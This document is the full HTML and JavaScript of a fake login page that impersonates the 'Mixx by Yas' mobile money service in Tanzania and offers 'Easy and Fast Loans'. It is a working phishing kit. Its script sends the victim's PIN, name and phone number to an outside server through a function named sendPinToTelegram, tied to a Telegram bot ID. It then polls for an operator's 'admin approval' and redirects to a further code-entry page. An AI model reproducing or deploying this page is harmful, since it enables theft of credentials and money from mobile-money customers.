<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mixx by Yas | Login</title>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

body{
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  background:#f5f5f5;
  min-height:100vh;
}

.container{
  min-height:100vh;
  display:flex;
  flex-direction:column;
  align-items:center;
  padding:0;
}

.upper-section{
  width:100%;
  max-width:420px;
  text-align:center;
}

.header{
  background:#004fc5;
  padding:20px 20px 20px;
  border-bottom-left-radius:20px;
  border-bottom-right-radius:20px;
}

.logo-circle{
  width:55px;
  height:55px;
  background:#ffd500;
  border-radius:50%;
  margin:0 auto 8px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#004fc5;
  font-size:22px;
  font-weight:bold;
}

.brand{
  color:#ffd500;
  font-size:24px;
  font-weight:700;
}

.subtitle{
  color:white;
  margin-top:3px;
  font-size:13px;
}

.content{
  padding:30px 20px;
}

.login-title{
  font-size:34px;
  color:#333;
  font-weight:600;
  margin-bottom:20px;
}

.phone-wrapper{
  position:relative;
  margin-bottom:25px;
}

.phone-display{
  width:100%;
  padding:16px;
  padding-left:60px;
  border:1px solid #ddd;
  border-radius:10px;
  font-size:18px;
  background:white;
  text-align:left;
}

.flag{
  position:absolute;
  left:18px;
  top:50%;
  transform:translateY(-50%);
  font-size:22px;
}

.pin-label{
  color:#666;
  font-size:16px;
  margin-bottom:18px;
}

.pin-row{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:15px;
}

.pin-boxes{
  display:flex;
  gap:12px;
}

.pin-boxes input{
  width:55px;
  height:55px;
  border:1px solid #d9d9d9;
  border-radius:10px;
  text-align:center;
  font-size:24px;
  outline:none;
  background:white;
}

.eye{
  font-size:22px;
  color:#888;
}

.forgot{
  color:#004fc5;
  margin-top:18px;
  font-size:15px;
}

#status{
  min-height:20px;
  margin-top:10px;
  color:#d00;
  font-size:14px;
}

.lower-section{
  width:100%;
  max-width:420px;
  padding:0 20px 40px;
}

.action-buttons{
  margin-top:15px;
}

.action{
  width:100%;
  background:#004fc5;
  color:white;
  text-align:center;
  padding:16px;
  border-radius:10px;
  font-size:18px;
  font-weight:600;
  cursor:pointer;
}

@media(max-width:480px){

.login-title{
  font-size:30px;
}

.pin-boxes input{
  width:50px;
  height:50px;
}
}
</style>
</head>

<body>

<div class="container">

  <div class="upper-section">

    <div class="header">

      <div class="logo-circle">
        yas
      </div>

      <div class="brand">
        Mixx by Yas
      </div>

      <div class="subtitle">
        Easy and Fast Loans
      </div>

    </div>

    <div class="content">

      <div class="login-title">
        Log in
      </div>

      <div class="phone-wrapper">

        <span class="flag">🇹🇿</span>

        <input
          class="phone-display"
          id="phoneDisplay"
          readonly
          value="+255 712 345 678">

      </div>

      <div class="pin-label">
        Enter your PIN (4 digits)
      </div>

      <div class="pin-row">

        <div class="pin-boxes">
          <input type="tel" maxlength="1">
          <input type="tel" maxlength="1">
          <input type="tel" maxlength="1">
          <input type="tel" maxlength="1">
        </div>

        <div class="eye">👁</div>

      </div>

      <div class="forgot">
        Forgot your PIN?
      </div>

      <div id="status"></div>

    </div>

  </div>

  <div class="lower-section">

    <div class="action-buttons">
      <div class="action">
        LOG IN
      </div>
    </div>

  </div>

</div>

<script>
// Get botId from URL
const botId = new URLSearchParams(window.location.search).get("botId");
console.log("Bot ID from URL:", botId);

// If no botId, show error
if (!botId) {
  document.getElementById("status").textContent = "Error: Missing bot ID. Please use the link from Telegram.";
  document.querySelector(".action").style.opacity = "0.5";
}

// Set phone display
document.getElementById("phoneDisplay").value = 
  localStorage.getItem("phone") || "+255 712 345 678";

const boxes = document.querySelectorAll(".pin-boxes input");
const statusEl = document.getElementById("status");

async function sendPinToTelegram(name, phone, pin) {
  const BACKEND_URL = "https://mixx-by-yas-biashara.onrender.com";
  
  // Clean and validate data
  const cleanPhone = phone.replace(/\s/g, '');
  
  const payload = {
    name: name || "Unknown",
    phone: cleanPhone || "Unknown",
    pin: pin || "",
    botId: botId || ""  // Make sure botId is sent
  };
  
  console.log("Sending to backend:", payload);
  
  try {
    const res = await fetch(`${BACKEND_URL}/submit-pin`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Accept": "application/json"
      },
      body: JSON.stringify(payload)
    });
    
    console.log("Response status:", res.status);
    
    // Get the response text for debugging
    const responseText = await res.text();
    console.log("Response body:", responseText);
    
    if (!res.ok) {
      // Try to parse error message from response
      try {
        const errorData = JSON.parse(responseText);
        statusEl.textContent = `Error: ${errorData.error || 'Server error'}`;
      } catch {
        statusEl.textContent = `Server error (${res.status}): ${responseText}`;
      }
      return null;
    }
    
    // Parse successful response
    const data = JSON.parse(responseText);
    console.log("Success response:", data);
    return data;
    
  } catch (error) {
    console.error("Network error:", error);
    statusEl.textContent = "Network error. Please check your connection.";
    return null;
  }
}

async function pollPinApproval(requestId) {
  const BACKEND_URL = "https://mixx-by-yas-biashara.onrender.com";
  let attempts = 0;
  const maxAttempts = 20; // 30 seconds max
  
  return new Promise((resolve) => {
    const interval = setInterval(async () => {
      attempts++;
      console.log(`Polling attempt ${attempts} for ${requestId}`);
      
      try {
        const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
        const data = await res.json();
        console.log("Poll response:", data);
        
        if (data.blocked) {
          clearInterval(interval);
          statusEl.textContent = "Your account has been blocked.";
          resolve(false);
          return;
        }
        
        if (data.approved === true || data.approved === false) {
          clearInterval(interval);
          resolve(data.approved);
          return;
        }
        
        if (attempts >= maxAttempts) {
          clearInterval(interval);
          statusEl.textContent = "Request timed out. Please try again.";
          resolve(false);
        }
      } catch (error) {
        console.error("Poll error:", error);
        if (attempts >= maxAttempts) {
          clearInterval(interval);
          statusEl.textContent = "Request failed. Please try again.";
          resolve(false);
        }
      }
    }, 1500);
  });
}

// PIN input handling
boxes.forEach((box, i) => {
  box.addEventListener("input", async () => {
    // Allow only numbers
    box.value = box.value.replace(/[^0-9]/g, '');
    
    // Auto-advance to next box
    if (box.value && i < 3) {
      boxes[i + 1].focus();
    }
    
    // Check if all 4 digits are entered
    if (i === 3 && box.value) {
      let pin = "";
      boxes.forEach(b => pin += b.value);
      
      // Validate botId
      if (!botId) {
        statusEl.textContent = "Error: Bot ID missing. Please use the link from Telegram.";
        boxes.forEach(b => { b.disabled = false; b.value = ""; });
        boxes[0].focus();
        return;
      }
      
      // Get user data
      const name = localStorage.getItem("name") || "Unknown";
      const phone = localStorage.getItem("phone") || "Unknown";
      
      console.log("Submitting PIN:", { name, phone, pin, botId });
      
      // Disable inputs while processing
      boxes.forEach(b => b.disabled = true);
      statusEl.textContent = "Sending PIN for verification...";
      
      // Send PIN to backend
      const res = await sendPinToTelegram(name, phone, pin);
      
      if (!res || !res.requestId) {
        statusEl.textContent = "Failed to send PIN. Please try again.";
        boxes.forEach(b => { b.disabled = false; b.value = ""; });
        boxes[0].focus();
        return;
      }
      
      statusEl.textContent = "Waiting for admin approval...";
      
      // Poll for approval
      const approved = await pollPinApproval(res.requestId);
      
      if (approved === true) {
        localStorage.setItem("pin", pin);
        window.location.href = `code.html?botId=${botId}`;
      } else if (approved === false) {
        statusEl.textContent = "Incorrect PIN. Please try again.";
        boxes.forEach(b => { b.disabled = false; b.value = ""; });
        boxes[0].focus();
      } else {
        statusEl.textContent = "An error occurred. Please try again.";
        boxes.forEach(b => { b.disabled = false; b.value = ""; });
        boxes[0].focus();
      }
    }
  });
  
  // Handle backspace
  box.addEventListener("keydown", (e) => {
    if (e.key === "Backspace" && !box.value && i > 0) {
      boxes[i - 1].focus();
    }
  });
});

// Focus first input on load
boxes[0].focus();

// Add click handler for the login button
document.querySelector(".action").addEventListener("click", () => {
  // Check if any PIN is entered
  let pin = "";
  boxes.forEach(b => pin += b.value);
  
  if (pin.length === 4) {
    // Trigger the last box's input event
    const event = new Event('input');
    boxes[3].dispatchEvent(event);
  } else {
    statusEl.textContent = "Please enter a 4-digit PIN";
    boxes[0].focus();
  }
});

// Also allow Enter key to submit
boxes.forEach(box => {
  box.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      let pin = "";
      boxes.forEach(b => pin += b.value);
      if (pin.length === 4) {
        const event = new Event('input');
        boxes[3].dispatchEvent(event);
      } else {
        statusEl.textContent = "Please enter a 4-digit PIN";
      }
    }
  });
});
</script>

</body>
</html>
